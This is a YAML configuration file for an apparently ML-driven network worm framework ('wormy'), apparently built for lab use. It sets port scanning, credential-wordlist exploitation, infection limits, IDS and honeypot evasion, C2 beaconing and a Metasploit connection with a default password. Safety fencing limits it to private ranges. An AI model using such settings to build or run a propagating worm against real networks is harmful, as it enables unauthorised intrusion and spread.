network:
  target_ranges:
    - "192.168.1.0/24"
  excluded_ips:
    - "192.168.1.1"
  scan_timeout: 5
  max_threads: 50
  ports_to_scan:
    - 21
    - 22
    - 23
    - 80
    - 135
    - 139
    - 443
    - 445
    - 1433
    - 3306
    - 3389
    - 5432
    - 5900
    - 6379
    - 8080
    - 8443
    - 9200
    - 27017

exploit:
  max_exploit_attempts: 3
  exploit_timeout: 30
  use_credentials: true
  credential_wordlist: "wordlists/common_creds.txt"
  enable_smb: true
  enable_ssh: true
  enable_web: true

propagation:
  max_infections: 50
  propagation_delay: 3.0
  persistence_enabled: false
  self_replicate: false
  mutation_enabled: false

evasion:
  stealth_mode: true
  randomize_timing: true
  detect_honeypots: true
  detect_ids: true
  encrypt_traffic: true
  max_scan_rate: 100

c2:
  c2_server: "127.0.0.1"
  c2_port: 8443
  beacon_interval: 60
  use_encryption: true
  backup_c2_servers: []
  c2_protocol: "https"

ml:
  host_classifier_path: "ml_models/saved/host_classifier.pkl"
  rl_agent_path: "ml_models/saved/rl_agent.zip"
  evasion_model_path: "ml_models/saved/evasion_model.pkl"
  use_pretrained: false
  online_learning: true

safety:
  kill_switch_enabled: true
  kill_switch_code: "EMERGENCY_STOP_2024"
  auto_destruct_time: 0
  geofence_enabled: true
  allowed_networks:
    - "192.168.0.0/16"
    - "10.0.0.0/8"
  max_runtime_hours: 4
  enable_logging: true
  log_encryption: true

metasploit:
  enabled: true
  host: "127.0.0.1"
  port: 55553
  user: "msf"
  password: "wormy2024"          # Default — override via WORMY_MSF_PASSWORD env var
  auto_start: false
  lhost: ""
  lport_base: 4444
